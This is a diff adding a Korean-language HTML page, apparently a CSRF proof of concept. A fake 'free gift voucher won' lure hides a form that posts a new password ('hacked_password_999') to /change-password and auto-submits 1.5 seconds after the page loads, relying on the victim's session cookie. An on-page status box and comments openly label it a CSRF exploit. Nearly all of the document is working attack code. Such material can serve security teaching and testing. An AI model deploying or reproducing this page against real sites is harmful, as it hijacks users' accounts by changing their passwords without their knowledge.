@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>축하합니다! 무료 이벤트 당첨!</title>
+    <style>
+        body { font-family: sans-serif; background-color: #ffeaa7; text-align: center; padding: 60px 20px; }
+        .box { background: white; padding: 40px; border-radius: 12px; max-width: 550px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); }
+        h1 { color: #d63031; font-size: 26px; margin-bottom: 15px; }
+        p { color: #2d3436; font-size: 16px; line-height: 1.6; }
+        .exploit-status { margin-top: 25px; padding: 15px; background: #dfe6e9; border-radius: 8px; font-family: monospace; font-size: 14px; text-align: left; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>🎁 무료 상품권에 당첨되셨습니다!</h1>
+        <p>잠시만 기다려주시면 수령 페이지로 연결됩니다...</p>
+
+        <!-- ============================================================= -->
+        <!-- CSRF 공격 페이로드: 피해자의 권한(세션 쿠키)을 이용해 자동 전송되는 폼 -->
+        <!-- ============================================================= -->
+        <form id="csrfForm" action="/change-password" method="POST" style="display: none;">
+            <input type="hidden" name="new_password" value="hacked_password_999">
+        </form>
+
+        <div class="exploit-status">
+            <strong>[CSRF Exploit Execution]</strong><br>
+            • Target: <code>POST /change-password</code><br>
+            • Injected Parameter: <code>new_password=hacked_password_999</code><br>
+            • Auto-submitting in 1.5 seconds...
+        </div>
+    </div>
+
+    <script>
+        // 페이지 로드 후 1.5초 뒤에 폼을 자동으로 submit하여 CSRF 공격 실행
+        setTimeout(function() {
+            document.getElementById('csrfForm').submit();
+        }, 1500);
+    </script>
+</body>
+</html>
